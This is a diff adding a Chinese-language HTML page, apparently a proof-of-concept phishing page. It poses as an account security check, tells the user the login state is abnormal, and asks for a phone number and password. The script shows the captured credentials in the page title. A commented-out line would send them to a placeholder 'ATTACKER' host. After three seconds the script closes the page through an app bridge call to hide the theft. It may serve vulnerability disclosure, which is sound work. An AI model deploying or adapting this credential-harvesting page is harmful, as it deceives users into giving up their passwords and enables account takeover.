@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,that initial-scale=1,maximum increasing-scale=1,user-scalable=no">
+<title>安全验证</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,"PingFang SC",sans-serif;background:#f5f6fa;min-height:100vh}
+.overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.5);z-index:99;display:flex;align-items:center;justify-content:center}
+.dialog{background:#fff;border-radius:12px;width:85%;max-width:340px;overflow:hidden}
+.dialog-header{background:#ff4757;color:#fff;padding:16px;text-align:center}
+.dialog-header h3{font-size:16px;margin-bottom:4px}
+.dialog-header p{font-size:12px;opacity:.9}
+.dialog-body{padding:20px}
+.field{margin-bottom:14px}
+.field label{display:block;font-size:13px;color:#666;margin-bottom:6px}
+.field input{width:100%;padding:12px;border:1px solid #ddd;border-radius:6px;font-size:15px;outline:none}
+.field input:focus{border-color:#ff4757}
+.btn{width:100%;padding:13px;background:#ff4757;color:#fff;border:none;border-radius:6px;font-size:16px;font-weight:600;cursor:pointer}
+.btn:active{opacity:.8}
+.tip{text-align:center;margin-top:12px;font-size:11px;color:#999}
+.result{display:none;padding:20px;text-align:center}
+.result h2{color:#2ed573;margin-bottom:10px}
+</style>
+</head>
+<body>
+<div class="overlay">
+<div class="dialog">
+<div class="dialog-header">
+<h3>账号安全验证</h3>
+<p>检测到您的登录状态异常，请重新验证身份</p>
+</div>
+<div class="dialog-body" id="formArea">
+<div class="field">
+<label>手机号</label>
+<input type="tel" id="phone" placeholder="请输入注册手机号" maxlength="11">
+</div>
+<div class="field">
+<label>登录密码</label>
+<input type="password" id="pwd" placeholder="请输入密码">
+</div>
+<button class="btn" onclick="doVerify()">确认验证</button>
+<div class="tip">为保障您的设备和云存储数据安全</div>
+</div>
+<div class="result" id="resultArea">
+<h2>验证成功</h2>
+<p>身份已确认，即将返回...</p>
+</div>
+</div>
+</div>
+<script>
+function doVerify(){
+    var p=document.getElementById('phone').value;
+    var w=document.getElementById('pwd').value;
+    if(!p||!w){alert('请填写完整');return}
+
+    // PoC: 仅展示窃取到的数据（实际攻击会发送到远程服务器）
+    // new Image().src='https://ATTACKER/steal?phone='+encodeURIComponent(p)+'&pwd='+encodeURIComponent(w);
+
+    document.title='[STOLEN] phone:'+p+' pwd:'+w;
+
+    document.getElementById('formArea').style.display='none';
+    document.getElementById('resultArea').style.display='block';
+
+    // 3秒后调用 JSBridge 关闭页面，模拟正常流程
+    setTimeout(function(){
+        try{ webkit.closeAppPage(); }catch(e){}
+    }, 3000);
+}
+</script>
+</body>
+</html>
